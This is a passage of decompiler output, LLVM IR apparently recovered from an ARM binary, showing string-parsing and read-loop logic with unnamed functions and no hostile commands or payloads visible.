  store i32 %v2_823c, i32* %r0.global-to-local, align 4
  %v4_9584 = call i32 @function_fc8c(i8* %tmp168, i32 %v0_9578, i32 %v3_9574)
  store i32 %v4_9584, i32* %r0.global-to-local, align 4
  %v2_958c = add i32 %v4_9584, %v2_823c
  %v3_958c = inttoptr i32 %v2_958c to i8*
  %v4_958c = load i8, i8* %v3_958c, align 1
  %v2_9594 = icmp ugt i8 %v4_958c, 31
  store i1 %v2_9594, i1* %cpsr_c.global-to-local, align 1
  %v7_9594 = icmp eq i8 %v4_958c, 32
  store i1 %v7_9594, i1* %cpsr_z.global-to-local, align 1
  %v2_959c = zext i1 %v7_9594 to i32
  %v2_959c.v4_9584 = add i32 %v2_959c, %v4_9584
  store i32 %v2_959c.v4_9584, i32* @r4, align 4
  %v2_95a0 = add i32 %v2_959c.v4_9584, %v2_823c
  store i32 %v2_95a0, i32* @r6, align 4
  store i32 %v2_95a0, i32* %r0.global-to-local, align 4
  %v1_95a8 = load i32, i32* %fp.global-to-local, align 4
  %v2_95a8 = sub i32 %v1_95a8, %v2_959c.v4_9584
  store i32 %v2_95a8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_159b0.30 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_95b4 = call i32 @function_f9f4(i32 %v2_95a0, i32 %v2_95a8, i32 ptrtoint ([3 x i8]* @global_var_159b0.30 to i32), i32 2)
  store i32 %v5_95b4, i32* %r0.global-to-local, align 4
  %v2_95b8 = icmp eq i32 %v5_95b4, -1
  store i1 %v2_95b8, i1* %cpsr_c.global-to-local, align 1
  %v7_95b8 = icmp eq i32 %v5_95b4, -1
  store i1 %v7_95b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_95b8, label %dec_label_pc_96d8, label %dec_label_pc_95c0

dec_label_pc_95c0:                                ; preds = %dec_label_pc_956c
  %v2_95c0 = icmp ne i32 %v5_95b4, 0
  store i1 %v2_95c0, i1* %cpsr_c.global-to-local, align 1
  %v7_95c0 = icmp eq i32 %v5_95b4, 1
  store i1 %v7_95c0, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_8654, i32* %r2.global-to-local, align 4
  %v7_95c8 = icmp slt i32 %v5_95b4, 2
  br i1 %v7_95c8, label %bb201, label %bb200

bb200:                                            ; preds = %dec_label_pc_95c0
  %v9_95c8 = add i32 %v5_95b4, -2
  store i32 %v9_95c8, i32* %r0.global-to-local, align 4
  br label %bb201

bb201:                                            ; preds = %dec_label_pc_95c0, %bb200
  %v1_95d0 = phi i32 [ %v5_95b4, %dec_label_pc_95c0 ], [ %v9_95c8, %bb200 ]
  %v2_95d0 = add i32 %v1_95d0, %v2_86d0
  store i32 -20773, i32* @lr, align 4
  %v1_95d8 = add i32 %v1_95d0, 1
  store i32 %v1_95d8, i32* @r5, align 4
  %v1_95dc = load i32, i32* @r4, align 4
  %v2_95dc = add i32 %v2_95d0, %v1_95dc
  store i32 %v2_95dc, i32* %ip.global-to-local, align 4
  store i32 0, i32* @r7, align 4
  %v0_95e4 = load i32, i32* @r6, align 4
  store i32 %v0_95e4, i32* %r0.global-to-local, align 4
  store i32 %v1_95d8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_159e0.40 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v4_95f4 = add i32 %v2_95dc, -20773
  %v5_95f4 = inttoptr i32 %v4_95f4 to i8*
  store i8 0, i8* %v5_95f4, align 1
  %v5_95f8 = call i32 @function_f9f4(i32 %v0_95e4, i32 %v1_95d8, i32 ptrtoint ([5 x i8]* @global_var_159e0.40 to i32), i32 4)
  store i32 %v5_95f8, i32* %r0.global-to-local, align 4
  %v2_95fc = icmp ugt i32 %v5_95f8, 3
  store i1 %v2_95fc, i1* %cpsr_c.global-to-local, align 1
  %v7_95fc = icmp eq i32 %v5_95f8, 4
  store i1 %v7_95fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_95fc, label %dec_label_pc_99c0, label %dec_label_pc_9604

dec_label_pc_9604:                                ; preds = %bb201
  store i32 %v2_823c, i32* %r1.global-to-local, align 4
  %v1_9608 = load i32, i32* @r4, align 4
  %v2_9608 = add i32 %v1_9608, %v2_823c
  %v3_9608 = inttoptr i32 %v2_9608 to i8*
  %v4_9608 = load i8, i8* %v3_9608, align 1
  %v6_9608 = zext i8 %v4_9608 to i32
  store i32 %v6_9608, i32* %r3.global-to-local, align 4
  %v2_960c = icmp ugt i8 %v4_9608, 46
  store i1 %v2_960c, i1* %cpsr_c.global-to-local, align 1
  %v7_960c = icmp eq i8 %v4_9608, 47
  store i1 %v7_960c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_960c, label %dec_label_pc_9bc0, label %dec_label_pc_9614

dec_label_pc_9614:                                ; preds = %dec_label_pc_9660, %dec_label_pc_9bf0, %dec_label_pc_9bc0, %dec_label_pc_9a90, %dec_label_pc_9a74, %dec_label_pc_9604, %dec_label_pc_9c08, %dec_label_pc_9abc
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_9618 = load i32, i32* @sl, align 4
  %v3_9618 = add i32 %v2_9618, -1448
  %v4_9618 = inttoptr i32 %v3_9618 to i8*
  store i8 1, i8* %v4_9618, align 1
  br label %dec_label_pc_87ac

dec_label_pc_9620:                                ; preds = %dec_label_pc_87a4
  %v0_9620 = call i32 @function_10a30()
  store i32 %v0_9620, i32* %r0.global-to-local, align 4
  store i32 %v0_9620, i32* @r4, align 4
  br label %dec_label_pc_9628

dec_label_pc_9628:                                ; preds = %dec_label_pc_964c, %dec_label_pc_9620
  %v1_962c = phi i32 [ %v0_9620, %dec_label_pc_9620 ], [ %v0_9654, %dec_label_pc_964c ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_962c = inttoptr i32 %v1_962c to i32*
  store i32 0, i32* %v2_962c, align 4
  store i32 %v2_823c, i32* %r1.global-to-local, align 4
  %v0_9634 = load i32, i32* @sl, align 4
  %v1_9634 = add i32 %v0_9634, -1452
  %v2_9634 = inttoptr i32 %v1_9634 to i32*
  %v3_9634 = load i32, i32* %v2_9634, align 4
  store i32 %v3_9634, i32* %r0.global-to-local, align 4
  store i32 10240, i32* %r2.global-to-local, align 4
  %v0_963c = load i32, i32* %r3.global-to-local, align 4
  %v1_963c = add i32 %v0_963c, 16384
  store i32 %v1_963c, i32* %r3.global-to-local, align 4
  %v4_9640 = call i32 @function_10cc0(i32 %v3_9634, i32 %v2_823c, i32 10240, i32 %v1_963c)
  store i32 %v4_9640, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9644 = icmp eq i32 %v4_9640, 0
  store i1 %v2_9644, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9644, label %dec_label_pc_9508, label %dec_label_pc_964c

dec_label_pc_964c:                                ; preds = %dec_label_pc_9628
  %v3_964c = icmp eq i32 %v4_9640, -1
  store i1 %v3_964c, i1* %cpsr_c.global-to-local, align 1
  %v8_964c = icmp eq i32 %v4_9640, -1
  store i1 %v8_964c, i1* %cpsr_z.global-to-local, align 1
  %v0_9654 = load i32, i32* @r4, align 4
  br i1 %v3_964c, label %dec_label_pc_9654, label %dec_label_pc_9628

dec_label_pc_9654:                                ; preds = %dec_label_pc_964c
  %v1_9654 = inttoptr i32 %v0_9654 to i32*
  %v2_9654 = load i32, i32* %v1_9654, align 4
  store i32 %v2_9654, i32* %r3.global-to-local, align 4
  %v2_9658 = icmp ugt i32 %v2_9654, 10
  store i1 %v2_9658, i1* %cpsr_c.global-to-local, align 1
  %v7_9658 = icmp eq i32 %v2_9654, 11
  store i1 %v7_9658, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9658, label %dec_label_pc_9660, label %dec_label_pc_9510

dec_label_pc_9660:                                ; preds = %dec_label_pc_9654
  %v0_9660 = load i32, i32* @sl, align 4
  %v1_9660 = add i32 %v0_9660, -1448
  %v2_9660 = inttoptr i32 %v1_9660 to i8*
  %v3_9660 = load i8, i8* %v2_9660, align 1
  %v4_9660 = zext i8 %v3_9660 to i32
  store i32 %v4_9660, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9664 = icmp eq i8 %v3_9660, 0
  store i1 %v2_9664, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9664, label %dec_label_pc_87ac, label %dec_label_pc_9614

dec_label_pc_9670:                                ; preds = %dec_label_pc_8db4
  %v0_9670 = load i32, i32* %r3.global-to-local, align 4
  %v1_9670 = add i32 %v0_9670, 1
  store i32 %v1_9670, i32* %r3.global-to-local, align 4
  %v1_9674 = trunc i32 %v1_9670 to i8
  %v2_9674 = load i32, i32* @sl, align 4
  %v3_9674 = add i32 %v2_9674, -1448
  %v4_9674 = inttoptr i32 %v3_9674 to i8*
  store i8 %v1_9674, i8* %v4_9674, align 1
  br label %dec_label_pc_87ac

dec_label_pc_967c:                                ; preds = %dec_label_pc_8c2c
  %v0_967c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_967c, i32* @r0, align 4
  %v0_9680 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_9680, i32* %r1.global-to-local, align 4
  %v2_9684 = inttoptr i32 %v0_967c to i8*
  %v3_9684 = call i32 @function_f964(i8* %v2_9684, i32 %v0_9680)
  store i32 %v3_9684, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8c44

dec_label_pc_968c:                                ; preds = %dec_label_pc_8d34
  store i32 104, i32* %r3.global-to-local, align 4
  %v1_9690 = load i32, i32* %fp.global-to-local, align 4
  %v2_9690 = inttoptr i32 %v1_9690 to i32*
  store i32 104, i32* %v2_9690, align 4
  %v0_9694 = load i32, i32* @sl, align 4
  %v1_9694 = add i32 %v0_9694, -1452
  %v2_9694 = inttoptr i32 %v1_9694 to i32*
  %v3_9694 = load i32, i32* %v2_9694, align 4
  store i32 %v3_9694, i32* %r0.global-to-local, align 4
  %v1_9698 = call i32 @function_10608(i32 %v3_9694)
  store i32 %v1_9698, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_96a4 = load i32, i32* @sl, align 4
  %v2_96a4 = add i32 %v1_96a4, -1452
  %v3_96a4 = inttoptr i32 %v2_96a4 to i32*
  store i32 -1, i32* %v3_96a4, align 4
  %v0_96a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_96a8 = trunc i32 %v0_96a8 to i8
  %v2_96a8 = load i32, i32* @sl, align 4
  %v3_96a8 = add i32 %v2_96a8, -1448
  %v4_96a8 = inttoptr i32 %v3_96a8 to i8*
  store i8 %v1_96a8, i8* %v4_96a8, align 1
  br label %dec_label_pc_87ac

dec_label_pc_96b0:                                ; preds = %dec_label_pc_8d5c
  %v0_96b0 = load i32, i32* %fp.global-to-local, align 4
  %v1_96b0 = inttoptr i32 %v0_96b0 to i32*
  %v2_96b0 = load i32, i32* %v1_96b0, align 4
  store i32 %v2_96b0, i32* %r3.global-to-local, align 4
  %v2_96b4 = icmp ugt i32 %v2_96b0, 10
  store i1 %v2_96b4, i1* %cpsr_c.global-to-local, align 1
  %v7_96b4 = icmp eq i32 %v2_96b0, 11
  store i1 %v7_96b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_96b4, label %dec_label_pc_87ac, label %dec_label_pc_96bc

dec_label_pc_96bc:                                ; preds = %dec_label_pc_96b0
  %v0_96bc = load i32, i32* @sl, align 4
  %v1_96bc = add i32 %v0_96bc, -1452
  %v2_96bc = inttoptr i32 %v1_96bc to i32*
  %v3_96bc = load i32, i32* %v2_96bc, align 4
  store i32 %v3_96bc, i32* %r0.global-to-local, align 4
  %v1_96c0 = call i32 @function_10608(i32 %v3_96bc)
  store i32 %v1_96c0, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_96cc = load i32, i32* @sl, align 4
  %v2_96cc = add i32 %v1_96cc, -1452
  %v3_96cc = inttoptr i32 %v2_96cc to i32*
  store i32 -1, i32* %v3_96cc, align 4
  %v0_96d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_96d0 = trunc i32 %v0_96d0 to i8
  %v2_96d0 = load i32, i32* @sl, align 4
  %v3_96d0 = add i32 %v2_96d0, -1448
  %v4_96d0 = inttoptr i32 %v3_96d0 to i8*
  store i8 %v1_96d0, i8* %v4_96d0, align 1
  br label %dec_label_pc_87ac

dec_label_pc_96d8:                                ; preds = %dec_label_pc_956c, %dec_label_pc_9548
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 37, i32* %r0.global-to-local, align 4
  %v3_96e0 = call i32 @function_efe8(i32 37, i32* null)
  %v0_96e4 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_96e4, i32* @r1, align 4
  store i32 %v3_96e0, i32* %r2.global-to-local, align 4
  store i32 %v2_823c, i32* %r0.global-to-local, align 4
  %v4_96f0 = call i32 @function_fc8c(i8* %tmp168, i32 %v0_96e4, i32 %v3_96e0)
  store i32 %v4_96f0, i32* %r0.global-to-local, align 4
  %v2_96f8 = icmp eq i32 %v4_96f0, -1
  store i1 %v2_96f8, i1* %cpsr_c.global-to-local, align 1
  %v7_96f8 = icmp eq i32 %v4_96f0, -1
  store i1 %v7_96f8, i1* %cpsr_z.global-to-local, align 1
  store i32 -20773, i32* @r6, align 4
  br i1 %v7_96f8, label %dec_label_pc_98f8, label %dec_label_pc_9704

dec_label_pc_9704:                                ; preds = %dec_label_pc_96d8
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 37, i32* %r0.global-to-local, align 4
  %v3_970c = call i32 @function_efe8(i32 37, i32* null)
  %v0_9710 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_9710, i32* @r1, align 4
  store i32 %v3_970c, i32* %r2.global-to-local, align 4
  store i32 %v2_823c, i32* %r0.global-to-local, align 4
  %v4_971c = call i32 @function_fc8c(i8* %tmp168, i32 %v0_9710, i32 %v3_970c)
  store i32 %v4_971c, i32* %r0.global-to-local, align 4
  %v2_9724 = add i32 %v4_971c, %v2_823c
  %v3_9724 = inttoptr i32 %v2_9724 to i8*
  %v4_9724 = load i8, i8* %v3_9724, align 1
  %v2_972c = icmp ugt i8 %v4_9724, 31
  store i1 %v2_972c, i1* %cpsr_c.global-to-local, align 1
  %v7_972c = icmp eq i8 %v4_9724, 32
  store i1 %v7_972c, i1* %cpsr_z.global-to-local, align 1
  %v2_9734 = zext i1 %v7_972c to i32
  %v2_9734.v4_971c = add i32 %v2_9734, %v4_971c
  store i32 %v2_9734.v4_971c, i32* @r4, align 4
  %v2_9738 = add i32 %v2_9734.v4_971c, %v2_823c
  store i32 %v2_9738, i32* @r5, align 4
  store i32 %v2_9738, i32* %r0.global-to-local, align 4
  %v1_9740 = load i32, i32* %fp.global-to-local, align 4
  %v2_9740 = sub i32 %v1_9740, %v2_9734.v4_971c
  store i32 %v2_9740, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_159b0.30 to i32), i32* %r2.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v5_974c = call i32 @function_f9f4(i32 %v2_9738, i32 %v2_9740, i32 ptrtoint ([3 x i8]* @global_var_159b0.30 to i32), i32 2)
  store i32 %v5_974c, i32* %r0.global-to-local, align 4
  %v2_9750 = icmp eq i32 %v5_974c, -1
  store i1 %v2_9750, i1* %cpsr_c.global-to-local, align 1
  %v7_9750 = icmp eq i32 %v5_974c, -1
  store i1 %v7_9750, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_974c, i32* @r7, align 4
  br i1 %v7_9750, label %dec_label_pc_98f8, label %dec_label_pc_975c

dec_label_pc_975c:                                ; preds = %dec_label_pc_9704
  %v2_975c = icmp ne i32 %v5_974c, 0
  store i1 %v2_975c, i1* %cpsr_c.global-to-local, align 1
  %v7_975c = icmp eq i32 %v5_974c, 1
  store i1 %v7_975c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_8654, i32* %ip.global-to-local, align 4
  %v7_9764 = icmp slt i32 %v5_974c, 2
  br i1 %v7_9764, label %bb203, label %bb202

bb202:                                            ; preds = %dec_label_pc_975c
  %v9_9764 = add i32 %v5_974c, -2
  store i32 %v9_9764, i32* @r7, align 4
  br label %bb203

bb203:                                            ; preds = %dec_label_pc_975c, %bb202
  %v1_976c = phi i32 [ %v5_974c, %dec_label_pc_975c ], [ %v9_9764, %bb202 ]
  store i32 %v2_86d0, i32* %ip.global-to-local, align 4
  %v2_976c = add i32 %v1_976c, %v2_86d0
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_9774 = load i32, i32* @r4, align 4
  %v2_9774 = add i32 %v2_976c, %v1_9774
  store i32 %v2_9774, i32* %r2.global-to-local, align 4
  %v3_9778 = load i32, i32* @r6, align 4
  %v4_9778 = add i32 %v3_9778, %v2_9774
  %v5_9778 = inttoptr i32 %v4_9778 to i8*
  store i8 0, i8* %v5_9778, align 1
  store i32 %v10_82b0, i32* @lr, align 4
  %v0_9780 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_9780, i32* %stack_var_-44, align 4
  store i32 %v2_823c, i32* %r1.global-to-local, align 4
  %v1_9788 = load i32, i32* @r4, align 4
  %v2_9788 = add i32 %v1_9788, %v2_823c
  %v3_9788 = inttoptr i32 %v2_9788 to i8*
  %v4_9788 = load i8, i8* %v3_9788, align 1
  %v6_9788 = zext i8 %v4_9788 to i32
  store i32 %v6_9788, i32* %r0.global-to-local, align 4
  %v1_978c = add nsw i32 %v6_9788, -48
  store i32 %v1_978c, i32* %r3.global-to-local, align 4
  %v2_9790 = icmp ugt i32 %v1_978c, 8
  store i1 %v2_9790, i1* %cpsr_c.global-to-local, align 1
  %v7_9790 = icmp eq i32 %v1_978c, 9
  store i1 %v7_9790, i1* %cpsr_z.global-to-local, align 1
  %v2_9794 = xor i1 %v7_9790, true
  %v3_9794 = and i1 %v2_9790, %v2_9794
  br i1 %v3_9794, label %.thread113, label %dec_label_pc_979c

.thread113:                                       ; preds = %bb203
  %v4_9794 = load i32, i32* @r5, align 4
  store i32 %v4_9794, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_97c4

dec_label_pc_979c:                                ; preds = %bb203
  %v1_97a8.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_97a0

dec_label_pc_97a0:                                ; preds = %dec_label_pc_97a0, %dec_label_pc_979c
  %v0_97b8 = phi i32 [ %v1_97b8, %dec_label_pc_97a0 ], [ 1, %dec_label_pc_979c ]
  store i32 %v10_82b0, i32* %r2.global-to-local, align 4
  store i32 %v0_97b8, i32* %stack_var_-44, align 4
  %v2_97a8 = add i32 %v0_97b8, %v1_97a8.pre
  %v3_97a8 = inttoptr i32 %v2_97a8 to i8*
  %v4_97a8 = load i8, i8* %v3_97a8, align 1
  %v6_97a8 = zext i8 %v4_97a8 to i32
  store i32 %v6_97a8, i32* %r0.global-to-local, align 4
  %v1_97ac = add nsw i32 %v6_97a8, -48
  store i32 %v1_97ac, i32* %r3.global-to-local, align 4
  store i32 %v0_97b8, i32* %ip.global-to-local, align 4
  %v2_97b4 = icmp ugt i32 %v1_97ac, 8
  store i1 %v2_97b4, i1* %cpsr_c.global-to-local, align 1
  %v7_97b4 = icmp eq i32 %v1_97ac, 9
  store i1 %v7_97b4, i1* %cpsr_z.global-to-local, align 1
  %v1_97b8 = add i32 %v0_97b8, 1
  store i32 %v1_97b8, i32* @lr, align 4
  store i32 %v2_97a8, i32* %r1.global-to-local, align 4
  %v2_97c0 = xor i1 %v2_97b4, true
  %v3_97c0 = or i1 %v7_97b4, %v2_97c0
  br i1 %v3_97c0, label %dec_label_pc_97a0, label %dec_label_pc_97c4

dec_label_pc_97c4:                                ; preds = %dec_label_pc_97a0, %.thread113
  %v2_97d0 = phi i32 [ %v4_9794, %.thread113 ], [ %v2_97a8, %dec_label_pc_97a0 ]
  %v0_97c4 = phi i32 [ %v6_9788, %.thread113 ], [ %v6_97a8, %dec_label_pc_97a0 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_97c4 = icmp eq i32 %v0_97c4, 0
  store i1 %v2_97c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_97c4, label %dec_label_pc_98f8, label %dec_label_pc_97cc

dec_label_pc_97cc:                                ; preds = %dec_label_pc_97c4
  store i32 0, i32* @r6, align 4
  %v3_97d0 = inttoptr i32 %v2_97d0 to i8*
  store i8 0, i8* %v3_97d0, align 1
  store i32 %v10_82b0, i32* %r3.global-to-local, align 4
  %v3_97d8 = load i32, i32* %stack_var_-44, align 4
  %v1_97dc = add i32 %v3_97d8, 1
  store i32 %v1_97dc, i32* %ip.global-to-local, align 4
  store i32 %v1_97dc, i32* %stack_var_-44, align 4
  %v0_97e4 = load i32, i32* @r5, align 4
  %v2_97e4 = add i32 %v0_97e4, %v1_97dc
  %v3_97e4 = inttoptr i32 %v2_97e4 to i8*
  %v4_97e4 = load i8, i8* %v3_97e4, align 1
  %v6_97e4 = zext i8 %v4_97e4 to i32
  store i32 %v6_97e4, i32* %r3.global-to-local, align 4
  %v2_97e8 = icmp ugt i8 %v4_97e4, 31
  store i1 %v2_97e8, i1* %cpsr_c.global-to-local, align 1
  %v7_97e8 = icmp eq i8 %v4_97e4, 32
  store i1 %v7_97e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_97e8, label %bb205, label %bb204

bb204:                                            ; preds = %dec_label_pc_97cc
  store i32 %v2_97e4, i32* @r4, align 4
  br label %.thread37

bb205:                                            ; preds = %dec_label_pc_97cc
  %v2_97ec = add i32 %v3_97d8, 2
  store i32 %v2_97ec, i32* %ip.global-to-local, align 4
  %v2_97f0 = add i32 %v0_97e4, %v2_97ec
  store i32 %v2_97f0, i32* @r4, align 4
  store i32 %v10_82b0, i32* @lr, align 4
  store i32 %v2_97ec, i32* %v11_82b4, align 4
  %v0_97fc.pre = load i32, i32* @r4, align 4
  br label %.thread37

.thread37:                                        ; preds = %bb204, %bb205
  %v0_97fc = phi i32 [ %v2_97e4, %bb204 ], [ %v0_97fc.pre, %bb205 ]
  store i32 %v0_97fc, i32* %r0.global-to-local, align 4
  %v1_9800 = inttoptr i32 %v0_97fc to i8*
  %v2_9800 = call i32 @function_f93c(i8* %v1_9800)
  store i32 ptrtoint ([5 x i8]* @global_var_159e8.42 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_9800, i32* @r1, align 4
  %v0_980c = load i32, i32* @r4, align 4
  store i32 %v0_980c, i32* %r0.global-to-local, align 4
  %v3_9810 = inttoptr i32 %v0_980c to i8*
  %v4_9810 = call i32 @function_fc8c(i8* %v3_9810, i32 %v2_9800, i32 ptrtoint ([5 x i8]* @global_var_159e8.42 to i32))
  store i32 %v4_9810, i32* %r0.global-to-local, align 4
  %v2_9814 = icmp eq i32 %v4_9810, -1
  store i1 %v2_9814, i1* %cpsr_c.global-to-local, align 1
  %v7_9814 = icmp eq i32 %v4_9810, -1
  store i1 %v7_9814, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9814, label %.thread38, label %dec_label_pc_9824

.thread38:                                        ; preds = %.thread37
  store i32 %v10_82b0, i32* %r3.global-to-local, align 4
  %v4_981c = load i32, i32* %v11_82b4, align 4
  store i32 %v4_981c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_9858

dec_label_pc_9824:                                ; preds = %.thread37
  store i32 %v10_82b0, i32* %r1.global-to-local, align 4
  %v3_9828 = load i32, i32* %stack_var_-44, align 4
  %v0_982c = load i32, i32* @r5, align 4
  %v2_982c = add i32 %v0_982c, %v3_9828
  store i32 %v2_982c, i32* @r4, align 4
  store i32 %v2_982c, i32* %r0.global-to-local, align 4
  %v1_9834 = inttoptr i32 %v2_982c to i8*
  %v2_9834 = call i32 @function_f93c(i8* %v1_9834)
  store i32 ptrtoint ([5 x i8]* @global_var_159e8.42 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_9834, i32* @r1, align 4
  %v0_9840 = load i32, i32* @r4, align 4
  store i32 %v0_9840, i32* %r0.global-to-local, align 4
  %v4_9844 = inttoptr i32 %v0_9840 to i8*
  %v5_9844 = call i32 @function_fc8c(i8* %v4_9844, i32 %v2_9834, i32 ptrtoint ([5 x i8]* @global_var_159e8.42 to i32))
  store i32 %v5_9844, i32* %r0.global-to-local, align 4
  store i32 %v10_82b0, i32* %r2.global-to-local, align 4
  %v3_984c = load i32, i32* %stack_var_-44, align 4
  %v2_9850 = add i32 %v3_984c, %v5_9844
  store i32 %v2_9850, i32* %ip.global-to-local, align 4
  store i32 %v2_9850, i32* %stack_var_-44, align 4
  br label %dec_label_pc_9858

dec_label_pc_9858:                                ; preds = %.thread38, %dec_label_pc_9824
  %v0_9d34 = phi i32 [ %v4_981c, %.thread38 ], [ %v2_9850, %dec_label_pc_9824 ]
  %v0_9858 = load i32, i32* @r5, align 4
  %v2_9858 = add i32 %v0_9858, %v0_9d34
  %v3_9858 = inttoptr i32 %v2_9858 to i8*
  %v4_9858 = load i8, i8* %v3_9858, align 1
  %v6_9858 = zext i8 %v4_9858 to i32
  store i32 %v6_9858, i32* %r3.global-to-local, align 4
  %v2_985c = icmp ugt i8 %v4_9858, 33
  store i1 %v2_985c, i1* %cpsr_c.global-to-local, align 1
  %v7_985c = icmp eq i8 %v4_9858, 34
  store i1 %v7_985c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_985c, label %dec_label_pc_9d34, label %dec_label_pc_9864

dec_label_pc_9864:                                ; preds = %dec_label_pc_9d34, %dec_label_pc_9858, %dec_label_pc_9d5c
  %v0_9864 = load i32, i32* @r5, align 4
  store i32 %v0_9864, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_986c = inttoptr i32 %v0_9864 to i8*
  %v3_986c = call i32 @function_fa60(i8* %v2_986c, i32 10)
  store i32 %v3_986c, i32* %r0.global-to-local, align 4
  %v1_9870 = add i32 %v3_986c, -1
  store i32 %v1_9870, i32* %r3.global-to-local, align 4
  %v2_9874 = icmp ugt i32 %v1_9870, 7
  store i1 %v2_9874, i1* %cpsr_c.global-to-local, align 1
  %v7_9874 = icmp eq i32 %v1_9870, 8
  store i1 %v7_9874, i1* %cpsr_z.global-to-local, align 1
  %v2_9878 = xor i1 %v2_9874, true
  %v3_9878 = or i1 %v7_9874, %v2_9878
  br i1 %v3_9878, label %dec_label_pc_988c.preheader, label %dec_label_pc_98a0

dec_label_pc_988c.preheader:                      ; preds = %dec_label_pc_9864
  store i32 %v2_875c, i32* %r2.global-to-local, align 4
  %v6_987c = add i32 %v3_986c, %v2_875c
  store i32 %v6_987c, i32* @r4, align 4
  br label %dec_label_pc_988c

dec_label_pc_9888:                                ; preds = %dec_label_pc_988c
  %v1_9888 = call i32 @function_126fc(i32 1)
  store i32 %v1_9888, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_988c

dec_label_pc_988c:                                ; preds = %dec_label_pc_988c.preheader, %dec_label_pc_9888
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_9890 = call i32 @function_10254(i32* null)
  %v0_9894 = load i32, i32* @r4, align 4
  %v3_9894 = icmp uge i32 %v0_9894, %v2_9890
  store i1 %v3_9894, i1* %cpsr_c.global-to-local, align 1
  %v9_9894 = icmp eq i32 %v0_9894, %v2_9890
  store i1 %v9_9894, i1* %cpsr_z.global-to-local, align 1
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_989c = xor i1 %v9_9894, true
  %v3_989c = and i1 %v3_9894, %v2_989c
  br i1 %v3_989c, label %dec_label_pc_9888, label %dec_label_pc_98a0

dec_label_pc_98a0:                                ; preds = %dec_label_pc_988c, %dec_label_pc_9864
  store i32 %v10_82b0, i32* %r3.global-to-local, align 4
  %v3_98a4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_98a4, i32* @r4, align 4
  %v0_98a8 = load i32, i32* @r5, align 4
  %v2_98a8 = add i32 %v0_98a8, %v3_98a4
  store i32 %v2_98a8, i32* @r6, align 4
  store i32 %v2_98a8, i32* %r0.global-to-local, align 4
  %v1_98b0 = inttoptr i32 %v2_98a8 to i8*
  %v2_98b0 = call i32 @function_f93c(i8* %v1_98b0)
  store i32 ptrtoint ([5 x i8]* @global_var_159e0.40 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_98b0, i32* @r1, align 4
  %v0_98bc = load i32, i32* @r6, align 4
  store i32 %v0_98bc, i32* %r0.global-to-local, align 4
  %v4_98c0 = inttoptr i32 %v0_98bc to i8*
  %v5_98c0 = call i32 @function_fc8c(i8* %v4_98c0, i32 %v2_98b0, i32 ptrtoint ([5 x i8]* @global_var_159e0.40 to i32))
  store i32 %v5_98c0, i32* %r0.global-to-local, align 4
  %v2_98c4 = icmp ugt i32 %v5_98c0, 3
  store i1 %v2_98c4, i1* %cpsr_c.global-to-local, align 1
  %v7_98c4 = icmp eq i32 %v5_98c0, 4
  store i1 %v7_98c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_98c4, label %dec_label_pc_9c20, label %dec_label_pc_98cc

dec_label_pc_98cc:                                ; preds = %dec_label_pc_98a0
  %v0_98cc = load i32, i32* @r5, align 4
  %v1_98cc = load i32, i32* @r4, align 4
  %v2_98cc = add i32 %v1_98cc, %v0_98cc
  %v3_98cc = inttoptr i32 %v2_98cc to i8*
  %v4_98cc = load i8, i8* %v3_98cc, align 1
  %v6_98cc = zext i8 %v4_98cc to i32
  store i32 %v6_98cc, i32* @r3, align 4
  %v2_98d0 = icmp ugt i8 %v4_98cc, 46
